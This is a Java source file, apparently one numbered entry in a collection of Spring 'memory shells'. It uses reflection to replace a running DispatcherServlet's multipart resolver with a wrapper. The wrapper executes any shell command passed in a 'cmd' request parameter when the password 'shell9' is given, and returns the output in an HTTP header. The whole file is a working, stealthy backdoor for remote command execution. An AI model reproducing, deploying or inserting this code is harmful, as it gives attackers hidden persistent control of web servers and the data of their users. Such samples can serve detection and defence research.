package com.example.springshell.memshell;

import com.example.springshell.utils.Util;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.multipart.MultipartException;
import org.springframework.web.multipart.MultipartHttpServletRequest;
import org.springframework.web.multipart.MultipartResolver;
import org.springframework.web.servlet.DispatcherServlet;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class No9_MultipartResolverDelegateShell implements MultipartResolver {
    private MultipartResolver resolverDelegate;

    public No9_MultipartResolverDelegateShell(){
    }

    public No9_MultipartResolverDelegateShell(MultipartResolver resolverDelegate){
        this.resolverDelegate = resolverDelegate;
    }

    public static String injectShell() throws Exception {
        DispatcherServlet servlet = new Util().getServlet();
        Field field = Util.getField(DispatcherServlet.class,"multipartResolver");
        MultipartResolver multipartResolver = (MultipartResolver) field.get(servlet);
        No9_MultipartResolverDelegateShell multipartResolverDelegateShell = new No9_MultipartResolverDelegateShell(multipartResolver);
        field.set(servlet,multipartResolverDelegateShell);
        return "{\"result\":\"No9_MultipartResolverDelegateShell\"}";
    }

    @Override
    public boolean isMultipart(HttpServletRequest request) {
        String passwd = request.getParameter("pass");
        String cmd = request.getParameter("cmd");
        if (passwd!=null && cmd!=null && passwd.equals("shell9") && !cmd.isEmpty()){
            try {
                HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
                boolean islinux = true;
                String osType = System.getProperty("os.name");
                if (osType !=null && osType.toLowerCase().contains("win")){
                    islinux = false;
                }
                String[] cmds = islinux ? new String[]{"sh","-c",request.getParameter("cmd")} : new String[]{"cmd.exe","/c",request.getParameter("cmd")};
                InputStream in = null;
                in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
//                response.setHeader("Exec-result",new String(Base64.getEncoder().encode(output.getBytes())));
                response.setHeader("Exec-result",new String(output));
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        if(this.resolverDelegate != null){
            return this.resolverDelegate.isMultipart(request);
        }
        return false;
    }

    @Override
    public MultipartHttpServletRequest resolveMultipart(HttpServletRequest request) throws MultipartException {
        return null;
    }

    @Override
    public void cleanupMultipart(MultipartHttpServletRequest request) {

    }

}

